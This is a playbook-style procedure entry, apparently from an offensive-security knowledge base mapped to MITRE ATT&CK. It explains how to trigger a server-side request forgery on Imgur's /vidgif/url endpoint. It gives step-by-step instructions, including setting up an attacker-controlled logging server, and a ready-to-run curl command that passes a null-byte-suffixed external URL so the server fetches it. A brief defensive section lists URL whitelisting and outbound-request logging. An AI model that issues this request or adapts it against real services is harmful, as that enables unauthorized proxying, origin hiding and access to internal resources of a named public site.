---
id: proc-imgur-ssrf-trigger
tags:
  - ssrf
  - exploit
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-imgur-ssrf-trigger]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:39:09.819Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft and Trigger Imgur SSRF Request

## Summary

This procedure crafts and sends a malicious GET request to Imgur's /vidgif/url endpoint, exploiting the unsanitized 'url' parameter to force the server to make requests to an attacker-controlled external URL, demonstrating SSRF.

## Description

The attack targets Imgur's Ruby-based backend where the 'url' parameter in /vidgif/url is directly used for server-side fetches without validation. By supplying an external URL like https://crowdshield.com/.testing/xss.html%00 (with null byte), the attacker proxies requests through Imgur, hiding their origin and potentially accessing internal resources or enabling DoS.

## Requirements

1. Controllable external server to receive proxied requests
2. curl or similar HTTP client
3. Knowledge of URL encoding (e.g., %00 for null byte)

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all user-supplied URLs against a whitelist
- Disable or restrict server-side HTTP clients in public apps
- Log and alert on unexpected outbound requests from web servers

## Objectives

1. Trigger Imgur server to fetch arbitrary external URL
2. Proxy requests to bypass firewalls or origin checks
3. Enable further attacks like internal LAN access or content inclusion

## Instructions

### Step 1: Prepare Attacker-Controlled URL

**Context**: Set up a server hosting test files (e.g., xss.html) to log incoming requests.

No command; configure Apache or similar to log access.

> Ensure logs capture IP, method, and path.

### Step 2: Send Crafted SSRF Request

**Context**: Execute the request to trigger SSRF.

**Command** ([[commands/curl-imgur-ssrf-trigger]]):
```bash
curl "https://i.imgur.com/vidgif/url?url=https://crowdshield.com/.testing/xss.html%00" -v
```

> This sends a GET request with the malicious URL. The -v flag shows verbose output. Expected: 200 OK or similar from Imgur, with no URL rejection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-imgur-ssrf-trigger]]

## Tools Used


## Tags

- [[ssrf]]
- [[exploit]]
- [[web]]
